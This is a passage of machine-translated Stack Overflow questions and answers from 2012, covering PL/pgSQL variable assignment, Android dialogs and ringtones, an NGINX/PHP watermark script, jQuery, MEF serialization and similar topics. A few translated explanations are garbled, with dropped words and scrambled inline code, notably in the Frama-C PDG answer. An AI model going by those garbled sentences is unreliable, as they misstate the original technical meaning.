* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:19:39.927

您可以创建一个包含所有对象的字典，`User`并按`Provider`您感兴趣的内容进行索引，如下所示：

```
users = dict([(u.username, u) for u in User.objects.all()])
providers = dict([(p.name, p) for p in Provider.objects.all()]) 
```

（确保您在`for call in result:`for 循环之外执行此操作！）然后您可以将慢查询更改为：

```
 rate_cust = users[call[3]]
                    rate_prov = provided[call[5]] 
```

我猜用户和提供者的数量比调用少得多，这意味着将它们保存在字典中比为每次调用进行一次查询访问要快得多。

# android - 如何在 AlertDialog 中显示 CalendarView？

> ID：12328193
> 
> 赞同：8
> 
> 时间：2012-09-08T05:11:22.633
> 
> 标签：android, android-layout, android-widget, android-alertdialog, calendarview

我正在尝试在警报对话框中显示 CalendarView，但显示的只是月/年和星期几。这些是布局文件的内容：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/myLayout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >
<CalendarView
    android:id="@+id/calendarID"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:contentDescription="@string/cal_desc"
    android:maxDate="01/01/2013"
    android:minDate="09/01/2012"
    android:showWeekNumber="false"
    android:tag="my tag" />
</LinearLayout> 
```

这是我用来将布局添加到 AlertDialog 的代码：

```
LayoutInflater inflater = (LayoutInflater)getApplicationContext().getSystemService
              (Context.LAYOUT_INFLATER_SERVICE);
LinearLayout ll= (LinearLayout)inflater.inflate(R.layout.myLayout, null, false);
CalendarView cv = (CalendarView) ll.getChildAt(0);
cv.setOnDateChangeListener(new OnDateChangeListener() {

        @Override
        public void onSelectedDayChange(CalendarView view, int year, int month,
                int dayOfMonth) {
            // TODO Auto-generated method stub
            initScheduleEvent();
        }
    });
new AlertDialog.Builder(MomAppActivity.this)
    .setTitle("Event Calendar")
    .setMessage("Click to schedule or view events.")
    .setView(ll)
    .setPositiveButton("Ok", new DialogInterface.OnClickListener() {
        public void onClick(DialogInterface dialog, int whichButton) {
            //do nothing...yet
        }
    }).setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
        public void onClick(DialogInterface dialog, int whichButton) {
            // Do nothing.
        }
    }
    ).show(); 
```

看到我完全被难住了，任何帮助将不胜感激。该应用程序没有给我任何错误。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-24T00:16:43.500

日历需要一个最小高度才能正确显示。其余代码工作正常。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-24T20:23:51.010

试试这个[CalendarDialogBu​​ilder](https://github.com/heitorcolangelo/CalendarDialogBuilder)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T05:18:32.917

如果您想要自定义的对话框设计，您可以使用布局和小部件元素为对话框​​窗口创建自己的布局。

试试这些链接希望你能找到答案

1.  [http://www.mkyong.com/android/android-custom-dialog-example/](http://www.mkyong.com/android/android-custom-dialog-example/)

2.  [http://developer.android.com/guide/topics/ui/dialogs.html](http://developer.android.com/guide/topics/ui/dialogs.html)

3.  [http://www.helloandroid.com/tutorials/how-display-custom-dialog-your-android-application](http://www.helloandroid.com/tutorials/how-display-custom-dialog-your-android-application)

# database - 使用 PL/pgSQL 将查询结果存储在变量中

> ID：12328198
> 
> 赞同：164
> 
> 时间：2012-09-08T05:12:37.257
> 
> 标签：database, postgresql, stored-procedures, plpgsql, postgresql-9.1

如何将查询结果分配给 PL/pgSQL（PostgreSQL 的过程语言）中的变量？

我有一个功能：

```
CREATE OR REPLACE FUNCTION test(x numeric)
RETURNS character varying AS
$BODY$
DECLARE
name   character varying(255);
begin
 name ='SELECT name FROM test_table where id='||x;

 if(name='test')then
  --do somthing
 else
  --do the else part
 end if;
end;
return -- return my process result here
$BODY$
LANGUAGE plpgsql VOLATILE 
```

在上面的函数中，我需要存储这个查询的结果：

```
'SELECT name FROM test_table where id='||x; 
```

到变量`name`。

如何处理这个？

* * *

## 回答 #1

> 赞同：244
> 
> 时间：2012-09-08T05:29:10.637

我想你正在寻找[`SELECT select_expressions INTO`](http://www.postgresql.org/docs/current/interactive/plpgsql-statements.html#PLPGSQL-STATEMENTS-SQL-ONEROW)：

```
select test_table.name into name from test_table where id = x; 
```

这`name`将从`test_table`哪里提取`id`函数的参数并将其保留在`name`变量中。不要遗漏表名前缀，`test_table.name`否则您会抱怨引用不明确。

* * *

## 回答 #2

> 赞同：104
> 
> 时间：2012-09-08T07:14:47.780

要分配**单个变量**，您还可以在 PL/pgSQL 代码块中使用[**普通分配**](https://www.postgresql.org/docs/current/plpgsql-statements.html#PLPGSQL-STATEMENTS-ASSIGNMENT)，右侧带有[标量子查询](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-SCALAR-SUBQUERIES)：

```
name := (SELECT t.name from test_table t where t.id = x); 
```

实际上与[@mu 已经提供](https://stackoverflow.com/a/12328286/939860)`SELECT INTO`的类似，但有细微的差别：

*   `SELECT INTO`在我对 Postgres 14 的测试中，速度稍快一些。
    （在不涉及 的情况下，常量的简单分配`SELECT`仍然快 10 倍。）
*   `SELECT INTO`还设置了[特殊变量`FOUND`](https://www.postgresql.org/docs/current/plpgsql-statements.html#PLPGSQL-STATEMENTS-DIAGNOSTICS)，而普通赋值则没有。你可能想要一个或另一个。
*   `SELECT INTO`也可以一次分配**多个变量**。看：
    *   [SELECT INTO 具有多个归因](https://stackoverflow.com/questions/16311634/select-into-with-more-than-one-attribution/16311870#16311870)

值得注意的是，这也有效：

```
name := t.name from test_table t where t.id = x; 
```

没有前导的`SELECT`语句`SELECT`。但我*不会*使用这种混合动力车。正如@Pavel 评论的那样，最好使用前两个更清晰、记录在案的方法中的一个。

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2012-09-08T18:52:54.090

通常的模式是`EXISTS(subselect)`：

```
BEGIN
  IF EXISTS(SELECT name
              FROM test_table t
             WHERE t.id = x
               AND t.name = 'test')
  THEN
     ---
  ELSE
     ---
  END IF; 
```

此模式用于 PL/SQL、PL/pgSQL、SQL/PSM、...

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-05-08T09:35:16.350

> 创建学习表：

```
CREATE TABLE "public"."learning" (
    "api_id" int4 DEFAULT nextval('share_api_api_id_seq'::regclass) NOT NULL,
    "title" varchar(255) COLLATE "default"
); 
```

> 插入数据学习表：

```
INSERT INTO "public"."learning" VALUES ('1', 'Google AI-01');
INSERT INTO "public"."learning" VALUES ('2', 'Google AI-02');
INSERT INTO "public"."learning" VALUES ('3', 'Google AI-01'); 
```

> 步骤：01

```
CREATE OR REPLACE FUNCTION get_all (pattern VARCHAR) RETURNS TABLE (
        learn_id INT,
        learn_title VARCHAR
) AS $$
BEGIN
    RETURN QUERY SELECT
        api_id,
        title
    FROM
        learning
    WHERE
        title = pattern ;
END ; $$ LANGUAGE 'plpgsql'; 
```

> 步骤：02

```
SELECT * FROM get_all('Google AI-01'); 
```

> 步骤：03

```
DROP FUNCTION get_all(); 
```

**演示：** [![在此处输入图像描述](../Images/a66aa05a716aa05cd53d798b061a044c.png)](https://i.stack.imgur.com/nzMh0.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-04-15T11:54:40.917

使用单行[结果执行查询时](https://www.postgresql.org/docs/current/plpgsql-statements.html#PLPGSQL-STATEMENTS-SQL-ONEROW)，请使用以下语法：

```
SELECT select_expressions INTO [STRICT] target FROM ... 
```

其中`target`可以是记录变量、行变量或简单变量和记录/行字段的逗号分隔列表。

与, 不同`SELECT INTO`，`SELECT select_expressions INTO`不会创建表。

在您的示例中，您有一个简单的变量`name`，因此 select 语句将是：

```
SELECT test_table.name INTO name FROM test_table WHERE test_table.id = x; 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2018-10-08T12:35:34.977

您可以使用以下示例使用 PL/pgSQL 将查询结果存储在变量中：

```
 select * into demo from maintenanceactivitytrack ; 
    raise notice'p_maintenanceid:%',demo; 
```

# php - php脚本在NGINX上不起作用

> ID：12328200
> 
> 赞同：1
> 
> 时间：2012-09-08T05:12:54.643
> 
> 标签：php, nginx

我正在开发新的服务器 NGINX 并且遇到了一个 php 脚本的问题，这里是脚本

```
$src = $_GET['src'];

header('Content-type: image/jpeg');

//watermark.png will go in root dir watermark.php?src=test.jpg watermark.png w_test.php
if (eregi("200x290", $src)) {
    $watermark = imagecreatefrompng('empty.png');
} else {
    $watermark = imagecreatefrompng('no_image.png');
}
$watermark_width = imagesx($watermark);
$watermark_height = imagesy($watermark);
$image = imagecreatetruecolor($watermark_width, $watermark_height);
if(eregi('.gif',$src)) {
$image = imagecreatefromgif($src);
}
elseif(eregi('.jpeg',$src)||eregi('.jpg',$src)) {
$image = imagecreatefromjpeg($src);
}
elseif(eregi('.png',$src)) {
$image = imagecreatefrompng($src);
}
else {
exit("Your image is not a gif, jpeg or png image. Sorry.");
}
$size = getimagesize($src);
$dest_x = $size[0] - $watermark_width - 20;
$dest_y = $size[1] - $watermark_height - 0;
imagecolortransparent($watermark,imagecolorat($watermark,0,0));
imagecopyresampled($image, $watermark, $dest_x, $dest_y, 0, 0, $watermark_width, $watermark_height, $watermark_width, $watermark_height);

imagejpeg($image, "", 95);
imagedestroy($image);
imagedestroy($watermark); 
```

它是一个简单的水印脚本......它在 Apache 服务器上工作但不能在 NGINX 上工作任何人都可以帮助（Apache 提供输出但 NGINX 没有结果）NGINX Conf ....

```
server {
    server_name xxxx.com www.xxxx.com xxxx.info www.xxxx.info;
    listen xx.xxx.xx.xx;
    root /home/xxxx/public_html;
    index index.html index.htm index.php;
    access_log /var/log/virtualmin/xxxx.com_access_log;
    error_log /var/log/virtualmin/xxxx.com_error_log;
    fastcgi_param GATEWAY_INTERFACE CGI/1.1;
    fastcgi_param SERVER_SOFTWARE nginx;
    fastcgi_param QUERY_STRING $query_string;
    fastcgi_param REQUEST_METHOD $request_method;
    fastcgi_param CONTENT_TYPE $content_type;
    fastcgi_param CONTENT_LENGTH $content_length;
    fastcgi_param SCRIPT_FILENAME /home/xxxx/public_html$fastcgi_script_name;
    fastcgi_param SCRIPT_NAME $fastcgi_script_name;
    fastcgi_param REQUEST_URI $request_uri;
    fastcgi_param DOCUMENT_URI $document_uri;
    fastcgi_param DOCUMENT_ROOT /home/xxxx/public_html;
    fastcgi_param SERVER_PROTOCOL $server_protocol;
    fastcgi_param REMOTE_ADDR $remote_addr;
    fastcgi_param REMOTE_PORT $remote_port;
    fastcgi_param SERVER_ADDR $server_addr;
    fastcgi_param SERVER_PORT $server_port;
    fastcgi_param SERVER_NAME $server_name;
    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_pass localhost:9001;
    }
    #setting error pages

     error_page    404 = /xxxx.php;

     fastcgi_intercept_errors on;

     location ~* \.(js|css|png|jpg|jpeg|gif|ico|html|htm)$ {
     expires 1y;
     log_not_found off;
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T22:37:14.333

问题可能是您没有正确匹配您的位置。这就是我正在使用的。

```
index index.php;
location ~ \.php$ {
  include /etc/nginx/fastcgi.conf;
  fastcgi_index index.php;
  fastcgi_pass    127.0.0.1:9000;
  fastcgi_cache_valid   200 302  1h;
  fastcgi_cache_valid   301      1d;
  fastcgi_cache_valid   any      1m;
  fastcgi_cache_min_uses  1;
  fastcgi_cache_use_stale error  timeout invalid_header http_500;
} 
```

# jquery - 使用 jquerys nextUntil 存储时间数组并显示电视节目

> ID：12328201
> 
> 赞同：4
> 
> 时间：2012-09-08T05:12:55.850
> 
> 标签：jquery, ajax

我有一个要抓取的页面，其格式如下：

```
<ul>
<li>7 pm</li>
<li>8 pm</li>
<ul>

<h6 id="7 pm">7 pm</h6>
<div class="show">My TV Show #1</div>
<div class="show">My TV Show #2</div>
<div class="show">My TV Show #3</div>
<h6 id="8 pm">8 pm</h6> 
```

我怎样才能让它显示时间，然后显示该时间的所有节目？

我试图成功地将时间存储在任何数组中，但是当涉及到实际对时间数组进行操作时，我遇到了困难。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>jQuery PHP Page Scape</title>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
    <script type="text/javascript">
        $("document").ready(function() {
            var times = new Array();

            $.ajax({
                url: "curl.php",
                dataType: 'text',
                success: function(data) {
                    $(data).find('.wnt-top-r ul li').each(function(i, item) {
                        times.push($(item).text());
                        $('#content').append(times[i]);
                    });
                }
            });
        });
    </script>
</head>
<body>

    <div id="content"></div>

</body>
</html> 
```

谢谢，布赖恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T22:00:16.500

更改您的标记。对于您的布局如何完成，这是不可能的/优化的。

首先，有效的 HTML id 名称必须以字母开头。

其次，只能有1个相同的ID，不能重复。

第三，空格不是 ID 名称中的有效字符。

由于您的标记无效，这里有一个建议。

```
<div id="container">
    <ul>
        <li data-showtime="19">7pm</li>
        <li data-showtime="20">8pm</li>
        <li data-showtime="21">9pm</li>
    </ul>

    <h6 class="time-title time-19" data-showtime="19">7pm</h6>
    <div class="show time-19">My TV Show 1</div>
    <div class="show time-19">My TV Show 2</div>
    <div class="show time-19">My TV Show 3</div>
    <div class="show time-19">My TV Show 4</div>
    <div class="show time-19">My TV Show 5</div>
    <h6 class="time-title time-20" data-showtime="20">8pm</h6>
    <div class="show time-20">My TV Show 5</div>
    <div class="show time-20">My TV Show 6</div>
</div> 
```

和脚本：

```
 $(function() {
        showtime = {};
        $("#container").find("h6.time-title").each(function() {
            var t = $(this);
            var d = t.data();
            showtime[d.showtime] = {};
            showtime[d.showtime]['caption'] = t.text();

            var tempshows = [];
            $(".show.time-"+d.showtime).each(function() {
                showname = $(this).text();
                tempshows.push(showname)
            })

            showtime[d.showtime]['shows'] = tempshows;
        })

console.log(showtime);

    })
​ 
```

jsFiddle：http: [//jsfiddle.net/FhKAh/1/](http://jsfiddle.net/FhKAh/1/)

如果您无法更改标记并且必须处理此问题，请尝试以下操作：

```
showtime = {};
$("h6").each(function() {
    h6 = $(this);

    var tempshow = [];
    h6.nextUntil("h6").each(function() {
        tempshow.push($(this).text())
    });

    showtime[h6.text()] = {};
    showtime[h6.text()]['shows'] = tempshow;

});

    console.log(showtime); 
```

jsFiddle：http: [//jsfiddle.net/CGyBK/](http://jsfiddle.net/CGyBK/)

# file-uri - appletviewer 运行正常 浏览器不

> ID：12328205
> 
> 赞同：0
> 
> 时间：2012-09-08T05:13:36.243
> 
> 标签：file-uri, appletviewer

如果 jar 文件中的类中有以下表达式，则 appletviewer 会正确显示：

```
File objectFile = new File("configurationfile.dat"); 
```

用浏览器运行会报错。我改为

```
File objectFile = new File("\\\\mypc:8080/mymavenapp","configurationfile.dat"); 
```

和成功一样。使用 appletviewer DOS 窗口运行会显示以下消息：

```
\\mypc:8080\mymavenapp\configurationfile.dat (No se ha encontrado la ruta de acceso de la red) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T14:05:44.960

我将文件放在类的同一个包中并更改了以下内容：

```
objectFile = new File((new URI("file:C:/users/user/documents/NetBeansProjects/mavenHMI2/archivConfHMI.dat")));
                    fileInputStream = new FileInputStream(objectFile);
            objectInputStream = new ObjectInputStream(fileInputStream); 
```

经过：

```
InputStream is = getClass().getResourceAsStream("archivConfHMI.dat"); 
                    objectInputStream = new ObjectInputStream(is); 
```

# android - Android - 第一次如何设置默认铃声？

> ID：12328210
> 
> 赞同：0
> 
> 时间：2012-09-08T05:15:03.130
> 
> 标签：android, broadcastreceiver, ringtone, telephonymanager

我正在使用铃声管理器开发简单的应用程序。我可以为传入号码设置特定的铃声。但问题是当第二次来电时我的铃声工作正常。我需要自己第一次覆盖默认铃声。我怎样才能做到这一点。下面是我的代码片段。

```
public class IncomingCallReceiver extends BroadcastReceiver { 
public void onReceive(Context context, Intent intent) { 
    Bundle bundle = intent.getExtras(); 
        if(null == bundle)
            return; 
        try {   
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); 
            Class c = Class.forName(tm.getClass().getName());
            Method m = c.getDeclaredMethod("getITelephony");  
            m.setAccessible(true);
            com.android.internal.telephony.ITelephony telephonyService = (ITelephony) m.invoke(tm);  
            Bundle b = intent.getExtras();
            incommingNumber = b.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
            incom_call=incommingNumber; 
            // Get Current Time 
            Time today = new Time(Time.getCurrentTimezone());
            today.setToNow();
            currentTime=today.format("%k:%M");   
            try
            {
                currentTime_int = Integer.parseInt(currentTime.replaceAll("[^0-9.]",""));

            } 
            catch(NumberFormatException nfe)
            {
            } 
            try
            {           
                contacts_db = new ContactsDB(context);    
                contacts_db.open(); 
                Utilities.writeIntoLog("DB open");
                cursor = contacts_db.fetchGroupName_fromContacttable(incom_call,op_flag); 
                if( cursor != null )
                {   
                    cursor.moveToFirst();
                    groupname = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_GROUPNAME));
                    contactname = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_FIRSTNAME));
                } 
                cursor.close();
                contacts_db.close();
            }
            catch (Exception e)
            {
            }
            try
            {           
                contacts_db = new ContactsDB(context);    
                contacts_db.open(); 
                cursor = contacts_db.fetchDnD_Detail_fromGrouptable(groupname); 
                if( cursor != null )
                {
                    cursor.moveToFirst();
                    ringtonepath = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_GROUPRINGTONE_INGROUPTABLE));
                    dnd_start_time = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_GROUP_DND_STARTTIME));
                    dnd_end_time = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_GROUP_DND_ENDTIME));
                    dnd_ring_mode = cursor.getString(cursor.getColumnIndexOrThrow(ContactsDB.KEY_GROUP_DND_RINGMODE));
                } 
                cursor.close();
                contacts_db.close();
            }
            catch (Exception e)   
            {
            }

            dnd_starttime_int = Integer.parseInt(dnd_start_time.replaceAll("[^0-9.]",""));
            dnd_endtime_int = Integer.parseInt(dnd_end_time.replaceAll("[^0-9.]","")); 
            if(currentTime_int>=dnd_starttime_int && currentTime_int<=dnd_endtime_int)
            { 
                if(dnd_ring_mode.equals("Silent"))  
                {
                    mobilemode = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE); mobilemode.setRingerMode(AudioManager.RINGER_MODE_SILENT);  
                }
                else  
                {
                    mobilemode = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE); mobilemode.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);  
                }
            }  
            else     
            {
                mobilemode = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
                mobilemode.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                Uri ruri = Uri.parse(ringtonepath);  RingtoneManager.setActualDefaultRingtoneUri(context,RingtoneManager.TYPE_RINGTONE, ruri); 
            } 
        }
        catch (Exception e) 
        {
        }

}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T18:01:57.447

我认为您的主要问题是收到收入电话时您正在更改铃声。你应该改变这种方法，现在我提出了两种可能的情况：

1.  如果用户可以为用户/组选择特定的铃声，您应该在那个时候设置新的铃声。
2.  如果用户不能选择特定的铃声，您应该在应用程序第一次执行时设置它。

# jquery - Jquery hide() 文本被打印/选中

> ID：12328212
> 
> 赞同：0
> 
> 时间：2012-09-08T05:15:51.137
> 
> 标签：jquery, css

我有一个

```
<div>.......</div>
<div id="some_id"></div> 
```

在我的脚本中我已经完成了

```
$('#my_button').click(function(){
$('#some_id').toggle();
}) 
```

所以最初带有 div 的文本是使用 style=display:none 隐藏的，但是当我打印出来时，隐藏的文本也会被打印出来！我想要的是只有当文本可见时才会显示在打印输出中，如果隐藏它不应该出现在打​​印输出中

要重新创建，创建两个 div 标签并将其中一个设置为 style= display:none ，现在在 IE 中打开网页并选择全部，当您粘贴 MS word 或 excel 时，您甚至会看到隐藏的文本被选中

我想我需要使用 css 的@media，但我想不通

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:19:07.113

In your stylesheet use this:

```
@media print {
.noPrint {
    display:none;
}
} 
```

Then add `class='noprint'` (or add the noprint class to an exsiting class statement) in your HTML that you don't want to appear at the time of printing. like this

```
$('#my_button').click(function(){
     $('#some_id').toggle();
     if($('#some_id').is(":visible"))
     {
        $('#some_id').removeClass('noprint');
     }
     else
     {
        $('#some_id').addClass('noprint');
     }
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:23:57.473

Try like this

```
$(document).ready(function(){
    $('#some_id').hide();
    if($('#some_id').text())      
        $('#some_id').toggle();
}); 
```

and need to remove your "display:none;" prop as well.Hope it works for you.if it,then accept my ans

# iphone - How to create one more AppDelegate in Xcode 4.3.2?

> ID：12328218
> 
> 赞同：3
> 
> 时间：2012-09-08T05:16:27.643
> 
> 标签：iphone, ipad, uiviewcontroller, universal, appdelegate

I am working in iPhone application, Using Xcode 4.3.2 tool to develop it, Using universal application to create this application, but only one Appdelegate (i am using this appdelegate for iPhone) show in the project navigator, but i want another one Appdelegate for iPad, How to create this? please help me

Thanks in Advance

Screen shots for your reference:

![enter image description here](../Images/e75fed7bdafdad04020f174f8215d191.png)

![enter image description here](../Images/38c919a55a840abb86ff4985709fcb76.png)

![enter image description here](../Images/23a1ffbf5d921bdbef1559e88345c076.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:26:51.777

使用以下代码可能会对您有所帮助

```
id<UIApplicationDelegate> delegate = [[UIApplication sharedApplication] delegate]; 
if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad)
    AppDelegate_iPad *appDelegate = (AppDelegate_iPad *) delegate;
else
    AppDelegate_iPhone *appDelegate = (AppDelegate_iPhone *) delegate; 
```

# java - 如何杀死 Android 上的整个应用程序？

> ID：12328222
> 
> 赞同：3
> 
> 时间：2012-09-08T05:17:00.880
> 
> 标签：java, android, process, kill-process

> **可能重复：**
> [Android：如何杀死一个应用程序及其所有活动？](https://stackoverflow.com/questions/3105673/android-how-to-kill-an-application-with-all-its-activities)

我正在寻找一种方法来杀死整个应用程序（例如关闭进程），以防我的应用程序崩溃。我想这样做的原因是因为我的很多运行时数据都存储在一个静态类中，所以当应用程序崩溃时，这个类就会被杀死。

我已经看到有关 Android 哲学的相关问题（例如关于不杀死应用程序等），但现在我只需要杀死我的应用程序。我怎样才能做到这一点？

我的应用程序有多个活动，我尝试了以下操作。它所做的只是恢复以前的活动。

```
System.exit(0) 
```

```
 ActivityManager servMng
 servMng = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
 servMng.killBackgroundProcesses(<my package name>); 
```

```
android.os.Process.sendSignal(android.os.Process.myPid(),
android.os.Process.SIGNAL_KILL); 
```

`android.os.Process.killProcess(android.os.Process.myPid());`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-08T05:26:49.470

```
android.os.Process.killProcess(android.os.Process.myPid()); 
```

感谢@Thirumal 也可能重复[如何杀死一个应用程序的所有活动？](https://stackoverflow.com/questions/3105673/android-how-to-kill-an-application-with-all-its-activities)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:31:54.397

AFAIK android 哲学不允许从内存中杀死整个应用程序。Android 可以决定将您的应用程序保留在内存中以便更快地进行后续访问，或者它可以决定刷新它。您必须处理单个组件，例如活动、服务。在适当的时候关闭它们中的每一个，你应该没有任何问题。当你不需要它们时，让你的静态变量为空..

# context-free-grammar - PDG中各种曲线的含义

> ID：12328228
> 
> 赞同：1
> 
> 时间：2012-09-08T05:18:09.483
> 
> 标签：context-free-grammar, frama-c

我想知道 PDG 中曲线或圆弧的含义。哪些是数据依赖，哪些是控制依赖等等。

> ![在此处输入图像描述](../Images/8349c42f5b571fc8989571acf492c2f7.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T06:39:49.487

边缘的颜色代表**数据**依赖关系：蓝色代表是，黑色代表。箭头的形状代表**控制**依赖关系：圆圈代表是，普通箭头否则。线的种类代表**地址**依赖关系：点表示是，否则是普通的。

地址依赖关系类似于数据依赖关系，但针对分配的正确部分。例如，声明：

```
*p = c ? a : b; 
```

具有对 的控制依赖`c`、对 和 的数据依赖以及对和`a`的`b`地址依赖。`&p``p`

好吧，这在真正的 PDG 中并不完全像这样，因为该语句由 Frama-C 在中分解：

```
if (c) { *p = a; } else { *p = b; } 
```

但这就是想法。

# algorithm - 一个平衡的二叉搜索树，也是一个堆

> ID：12328234
> 
> 赞同：2
> 
> 时间：2012-09-08T05:18:52.773
> 
> 标签：algorithm, data-structures, heap, binary-search-tree

我正在寻找一种数据结构，其中每个元素都有两个键。其中一个结构是 BST，而另一个结构是堆。经过一番搜索，我找到了一个名为[Treap](http://en.wikipedia.org/wiki/Treap)的结构。它使用堆键上随机分布的堆属性来使 BST 平衡！

我想要的是一个平衡的 BST，它也可以是一个堆。如果我按照我选择的顺序插入带有堆键的元素，Treap 中的 BST 可能会不平衡。

有这样的数据结构吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T09:33:31.923

优先搜索树是一个既是平衡 BST 又是堆的结构。有关详细信息，请参阅[本文](http://wwwisg.cs.uni-magdeburg.de/ag/lehre/SS2009/GDS/slides/S10.pdf)或本书：[“数据结构和应用手册”](https://rads.stackoverflow.com/amzn/click/com/1584884355)（第 18.5 章）。

此结构可用于有效搜索在给定范围内具有所有“堆”键和“BST”键中的最少的元素。

# get - Sencha Touch 2\. 获取请求 GET 参数

> ID：12328242
> 
> 赞同：0
> 
> 时间：2012-09-08T05:20:43.353
> 
> 标签：get, request, sencha-touch-2

我的网址看起来像[http://www.mysite.com/?action=top&id=5](http://www.mysite.com/?action=top&id=5) 或（通过 mod_rewrite）[http://www.mysite.com/top/5](http://www.mysite.com/top/5)

如何在 Sencha Touch 中获取 GET 参数？在互联网上搜索没有给我工作解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T21:45:54.323

这样的事情可能会帮助你：

```
Ext.Object.fromQueryString(window.location.search.substring(1)); 
```

这不适用于 mod_rewrite 示例，因此可能检查 window.location.search.length > 0 并且如果没有执行一些正则表达式来过滤掉 /top/5 部分。

**编辑：**由于 Ext.urlDecode 现在已弃用，因此更改了代码。这是首选方法 (Ext.Object.fromQueryString) [docs.sencha.com - fromQueryString的文档链接](http://docs.sencha.com/touch/2-0/#!/api/Ext.Object-method-fromQueryString)

感谢**indapublic**的更正！

# c# - 如何将 MEF 导入和导出信息持久化到磁盘

> ID：12328243
> 
> 赞同：4
> 
> 时间：2012-09-08T05:20:45.473
> 
> 标签：c#, lazy-loading, mef

[对于我在这个问题](https://stackoverflow.com/questions/11951501/which-parts-of-mef-should-be-customized-for-dynamic-loading-of-plug-ins-in-a-dis)中描述的应用程序，我想使用 MEF 扫描可用的插件程序集，然后以序列化格式（例如一组字符串或内存流）存储所有可用的导入和导出信息。这是必要的，因为我需要在**不**加载插件程序集的情况下通过 AppDomain 边界传输导入和导出信息（本质上我想延迟加载插件）。我找到了一些参考资料，例如[这个](http://mef.codeplex.com/discussions/57392)或[这个，](https://stackoverflow.com/questions/4371539/lazy-loading-dlls-with-mef)但没有一个链接让我知道如何：

*   从程序集中提取所有导入和导出
*   序列化所有必需的导入/导出信息
*   然后再将序列化的信息重新水合到导入和导出中。

我想我可以使用[ReflectionModelServices 类](http://msdn.microsoft.com/en-us/library/system.componentmodel.composition.reflectionmodel.reflectionmodelservices.aspx)来创建导入/导出定义，但这仍然留下了序列化和反序列化部分。任何人都可以指出一些示例、文档或向我提供有关如何执行这些步骤的建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-11T23:43:33.033

这个问题的答案是由 Kevin 在[MEF 讨论列表](http://mef.codeplex.com/discussions/397088)上提供的。事实证明，可以使用以下代码片段从 MEF [ExportDefinition](http://msdn.microsoft.com/en-us/library/system.componentmodel.composition.primitives.exportdefinition%28v=vs.100%29.aspx)和[ImportDefinition数据结构中提取所有需要的信息。](http://msdn.microsoft.com/en-us/library/system.componentmodel.composition.primitives.importdefinition%28v=vs.100%29.aspx)

第一步是将程序集类型加载到目录中。然后为目录中的每个零件迭代导入和导出定义。导出定义只能放在类型、方法、属性和字段上（我的代码目前忽略了这些）。因此，可以使用以下代码来处理导出。

```
var exports = new List<Tuple<string, MemberInfo>>();
foreach (var export in part.ExportDefinitions)
{
    var memberInfo = ReflectionModelServices.GetExportingMember(export);
    Tuple<string, MemberInfo> exportDefinition = null;
    switch (memberInfo.MemberType)
    {
        case MemberTypes.Method:
            exportDefinition = new Tuple<string, MemberInfo>(export.ContractName, memberInfo.GetAccessors().First() as MethodInfo);
            break;
        case MemberTypes.NestedType:
        case MemberTypes.TypeInfo:
            exportDefinition = new Tuple<string, MemberInfo>(export.ContractName, memberInfo.GetAccessors().First() as Type);
            break;
        case MemberTypes.Property:
            // this is a bit ugly because we assume that the underlying methods for a property are named as:
            // get_PROPERTYNAME and set_PROPERTYNAME. In this case we assume that exports always
            // have a get method.
            var getMember = memberInfo.GetAccessors().Where(m => m.Name.Contains("get_")).First();
            var name = getMember.Name.Substring("get_".Length);
            var property = getMember.DeclaringType.GetProperty(name);
            exportDefinition = new Tuple<string, MemberInfo>(export.ContractName, property);
            break;

        default:
            throw new NotImplementedException();
    }

    exports.Add(exportDefinition);
} 
```

为了处理只能放在属性、参数和字段（再次被忽略）上的导入，可以使用以下代码：

```
public void ExtractImports()
{
